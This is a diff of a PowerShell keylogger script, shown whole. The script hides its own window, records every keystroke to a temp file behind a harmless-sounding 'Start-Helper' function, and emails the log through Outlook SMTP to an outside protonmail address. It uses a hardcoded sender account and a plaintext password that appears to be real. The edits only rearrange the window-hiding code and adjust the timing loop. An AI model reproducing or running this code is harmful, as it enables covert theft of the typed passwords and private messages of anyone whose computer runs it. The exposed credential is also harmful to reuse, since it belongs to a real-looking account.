@@ -1,9 +1,5 @@
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-
 $TimesToRun = 1
-$RunTimeP = 1	# Tempo em minutos
+$RunTimeP = 1	# Time in minutes
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
@@ -11,13 +7,16 @@ $Subject = "pragmatica"
 $body = "report"
 $SMTPServer = "smtp-mail.outlook.com"	# Outlook SMTP
 $SMTPPort = "587"
-$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-
+$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
-$TimeStart = Get-Date
-$TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
-# Requires -Version 2
+$TimeStart = Get-Date
+$TimeEnd = $timeStart.addminutes($RunTimeP)
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+
+#requires -Version 2
 function Start-Helper($Path="$env:temp\help.txt") 
 {
   $signatures = @'
@@ -37,42 +36,42 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
+
     $Runner = 0
-    while ($TimesToRun -ge $Runner) {
-      while ($TimeEnd -ge (Get-Date)) {
-        Start-Sleep -Milliseconds 40
-        
-        for ($ascii = 9; $ascii -le 254; $ascii++) {
-          $state = $API::GetAsyncKeyState($ascii)
+	while ($TimesToRun  -ge $Runner) {
+	while ($TimeEnd -ge $TimeNow) {
+      Start-Sleep -Milliseconds 40
+      
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        $state = $API::GetAsyncKeyState($ascii)
 
-          if ($state -eq -32767) {
-            $null = [console]::CapsLock
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
 
-            $virtualKey = $API::MapVirtualKey($ascii, 3)
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-            $kbstate = New-Object Byte[] 256
-            $checkkbstate = $API::GetKeyboardState($kbstate)
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
 
-            $mychar = New-Object -TypeName System.Text.StringBuilder
+          $mychar = New-Object -TypeName System.Text.StringBuilder
 
-            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-            if ($success) 
-            {
-              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-            }
+          if ($success) 
+          {
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
           }
         }
       }
-      Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
-      Remove-Item -Path $Path -Force
-      $Runner++
+	  $TimeNow = Get-Date
     }
+	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
+	Remove-Item -Path $Path -force
+	}
   }
   finally
   {
-    exit 1
+	exit 1
   }
 }
-
 Start-Helper
